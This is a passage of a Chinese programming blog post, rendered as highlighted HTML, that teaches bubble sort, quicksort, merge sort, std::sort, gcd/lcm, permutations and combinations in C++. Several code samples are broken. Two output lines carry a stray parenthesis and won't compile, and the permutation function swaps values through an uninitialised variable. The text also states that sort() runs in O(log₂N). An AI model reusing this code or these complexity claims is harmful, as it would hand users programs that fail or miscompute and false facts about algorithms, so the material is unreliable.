class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n<span class="number">-1</span>;j++)   <span class="comment">//内层for循环控制相邻两元素进行比较 </span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(bubble[j]&gt;bubble[j+<span class="number">1</span>])   <span class="comment">//if(bubble[j]&lt;bubble[j+1]) </span></span><br><span class="line"><span class="comment">// 比较；两数大小并交换，前者从小到大排序，后者从大到小排序（也可以通过输出改变排列次序） </span></span><br><span class="line">{</span><br><span class="line">swap(&amp;bubble[j],&amp;bubble[j+<span class="number">1</span>]);<span class="comment">//交换两个数 </span></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; bubble[i]) &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设待排序数的个数为n；</p><p>不难看出，核心代码中，最短时间为n，最长为n^2,所以时间复杂度为O（n^2）；</p><h4 id="快速排序（Quick-Sort）"><a href="#快速排序（Quick-Sort）" class="headerlink" title="快速排序（Quick Sort）"></a>快速排序（Quick Sort）</h4><p>桶排序和冒泡排序虽然简单，但是如果有几万几亿个数排序，那效率就会非常低，这就需要一种快速的排序方法</p><p>——快速排序；</p><p>思路：</p><p>1.对于一个数组，首先选择一个基准值key，这个基准值可以随意选，但是一般选择的是这个数组的第一个元素；</p><p>2.我们对于这个数组，把数组中所有比基准值key小的元素向基准值key的左边扔，把数组中所有比基准值key大的</p><p>元素向key的右边扔；</p><p>3.这样的话基准值key就成为了一个”分界线”，所有比基准值key小的元素都在基准值key的左边，所有比基准值key</p><p>大的元素都在基准值key的右边；</p><p>4.之后我们在递归的对基准值key左边的序列和右边的序列再用以上方法进行排序；</p><p>5.最终整个序列就是有序的了；</p><h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> quick[<span class="number">101</span>],n; <span class="comment">//定义全局变量，需要在子函数中使用 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quicksort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,j,t,temp;</span><br><span class="line">    <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    } </span><br><span class="line">    temp=quick[left];  <span class="comment">// temp存的就是基准数 </span></span><br><span class="line">    i=left;</span><br><span class="line">    j=right;</span><br><span class="line">    <span class="keyword">while</span>(i!=j)  <span class="comment">//顺序很重要 </span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span>(quick[j]&gt;=temp&amp;&amp;i&lt;j) j--;  <span class="comment">//从右往左找 </span></span><br><span class="line">        <span class="keyword">while</span>(quick[i]&lt;=temp&amp;&amp;i&lt;j) i++;  <span class="comment">//从左往右找 </span></span><br><span class="line">        <span class="keyword">if</span>(i&lt;j) <span class="comment">// 交换两个数在数组中的位置 </span></span><br><span class="line">        {</span><br><span class="line">            t=quick[i];</span><br><span class="line">            quick[i]=quick[j];</span><br><span class="line">            quick[j]=t;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 基准数归位 </span></span><br><span class="line">    quick[left]=quick[i];</span><br><span class="line">    quick[i]=temp;</span><br><span class="line">    quicksort(left,i<span class="number">-1</span>);  <span class="comment">//继续处理左边的，这是一个递归的过程 </span></span><br><span class="line">    quicksort(i+<span class="number">1</span>,right); <span class="comment">//继续处理右边的，这是一个递归的过程 </span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    { </span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; quick[i];</span><br><span class="line">    }</span><br><span class="line">    quicksort(<span class="number">1</span>,n);  <span class="comment">// 快排调用 </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; quick[i]) &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>理想的情况是，每次划分所选择的中间数恰好将当前序列几乎等分，经过log2n趟划分，便可得到长度为1的子</p><p>表。这样，整个算法的时间复杂度为O(nlog2n)；</p><p>最坏的情况是，每次所选的中间数是当前序列中的最大或最小元素，这使得每次划分所得的子表中一个为空表，另</p><p>一子表的长度为原表的长度-1。这样，长度为n的数据表的快速排序需要经过n趟划分，使得整个排序算法的时间</p><p>复杂度为O(n^2)；</p><p>平均起来，快速排序的时间复杂度为O（nlogn）；</p><h4 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h4><p>原理：</p><p>假设初始待排序数据有n个，可以将n个数据看成n个独立的子序列，因此每个子序列的长度为1，然后两两合并，</p><p>得到n/2个长度为2或1(如果n为奇数时，就会出现多出一个元素无法与其他元素合并)的有序子序列; 再两两合并，</p><p>一直重复下去，直到得到一个长度为n的有序序列为止（2路排序）；</p><p>核心：</p><p>两个有序子序列的合并；</p><p>（1）将待排序序列一分为二，对左右两边进行递归分割，得到m个子序列；</p><p>（2）对m个子序列递归执行合并操作，最终得到有序的序列；</p><h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原数组arr1，临时空间数组arr2</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> arr1[],<span class="keyword">int</span> arr2[],<span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i = low, j = mid+<span class="number">1</span>, k = low;</span><br><span class="line"><span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=high)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (arr1[i]&lt;arr1[j])</span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[i++];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[j++];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (i&lt;=mid)</span><br><span class="line">{</span><br><span class="line">arr2[k++] = arr1[i++];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (j&lt;=high)</span><br><span class="line">{</span><br><span class="line">    arr2[k++] = arr1[j++];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=low; i&lt;=high;i++)</span><br><span class="line">{</span><br><span class="line">arr1[i] = arr2[i];</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span> arr1[],<span class="keyword">int</span> arr2[],<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">//直到a=b时，停止递归。</span></span><br><span class="line"><span class="keyword">if</span> (a&lt;b)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">int</span> mid = (a+b)/<span class="number">2</span>;</span><br><span class="line">mergeSort(arr1,arr2,a,mid);</span><br><span class="line">mergeSort(arr1,arr2,mid+<span class="number">1</span>,b);</span><br><span class="line">merge(arr1,arr2,a,mid,b);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,a[<span class="number">10</span>]={<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">4</span>},b[<span class="number">10</span>];</span><br><span class="line">    mergeSort(a,b,<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="时间复杂度-3"><a href="#时间复杂度-3" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>归并排序稳定性比较高，最好情况、最坏情况都为nlogn，所以时间复杂度为O(nlogn)；</p><h4 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h4><p>sort() 是C++标准库里面的库函数，之前做编程练习题目的时候经常会用到，算是quicksort的另一种形式，因为时</p><p>间复杂度都为 O(log₂N)，完美地解决了所谓的TLE问题，直接上代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>],i,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">sort(a,a+n); <span class="comment">//调用sort函数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种是最简单的形式，默认从小到大，那从大到小呢？嘿嘿，别着急，来看：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span>  <span class="comment">//自定义函数 </span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> m&gt;n;</span><br><span class="line">} </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100</span>],i,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">}</span><br><span class="line">sort(a,a+n,cmp); <span class="comment">//调用sort函数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这种是加一个自定义函数cmp，用于大小比较，从小到大时也可以自定义一个函数，但是没必要其实；</p><p>还有其他很多种形式，去about页面，有我的联系方式，给我发信息给你代码（嘻嘻嘻）；</p><p>可以去练习一下，请见<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1040" target="_blank" rel="noopener">杭电1040</a></p><h3 id="gcd-amp-lcm"><a href="#gcd-amp-lcm" class="headerlink" title="gcd &amp; lcm"></a>gcd &amp; lcm</h3><p>gcd模板其实已经写烂了，但是几个月没碰过编程了，难免会有些生疏，再来回顾一下；</p><p>lcm也很简单，两数乘积除以最大公约数；</p><h4 id="gcd"><a href="#gcd" class="headerlink" title="gcd"></a>gcd</h4><p>先看最原始的代码（我第一次写的代码）：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="keyword">while</span>(b!=<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">t = a%b; </span><br><span class="line">a = b;</span><br><span class="line"> b = t;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; gcd(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>三目运算法（这个超级简单）：</p><p>不会三目运算符的回C语言再学习一下哦~</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> !b?a:gcd(b,a%b); <span class="comment">//三目运算符</span></span><br><span class="line">} </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; gcd(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="lcm"><a href="#lcm" class="headerlink" title="lcm"></a>lcm</h4><p>lcm其实没啥好说的，用三目来说，直接看代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> !b?a:gcd(b,a%b);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lcm</span><span class="params">(<span class="keyword">int</span> m,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (m*n)/gcd(m,n);</span><br><span class="line">} </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; lcm(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>是不是超级简单，那就去练习一下：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2504" target="_blank" rel="noopener">杭电2504</a></p><h3 id="排列组合"><a href="#排列组合" class="headerlink" title="排列组合"></a>排列组合</h3><p>排列组合也遇到过，解决“有多少种”这类问题经常遇见，只不过，这类问题都很简单，一学就会；概念高中已经学</p><p>过了，这里就不多说了；</p><h4 id="排列A"><a href="#排列A" class="headerlink" title="排列A"></a>排列A</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> i,t,ans=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(m&lt;n)</span><br><span class="line">{</span><br><span class="line">m=t;</span><br><span class="line">t=n;</span><br><span class="line">n=m;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span>(i=m;i&gt;=m-n+<span class="number">1</span>;i--)</span><br><span class="line">{</span><br><span class="line">ans *= i;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="keyword">if</span>(m&gt;n) <span class="built_in">cout</span> &lt;&lt; A(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; A(n,m) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="组合C"><a href="#组合C" class="headerlink" title="组合C"></a>组合C</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">C</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&gt;=n-k+<span class="number">1</span>;i--)</span><br><span class="line">    {</span><br><span class="line">    ans*=i;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=k;i++)</span><br><span class="line">    {</span><br><span class="line">    ans/=i;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n;</span><br><span class="line"><span class="keyword">if</span>(m&gt;n) <span class="built_in">cout</span> &lt;&lt; C(m,n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; C(n,m) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>快速幂这个算法可以用来计算那些次方很多数据很大的问题，有些问题会出现TLE，引入快速幂，很好得解决了这</p><p>个问题，它的时间复杂度为 O(log₂N)，上代码：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span 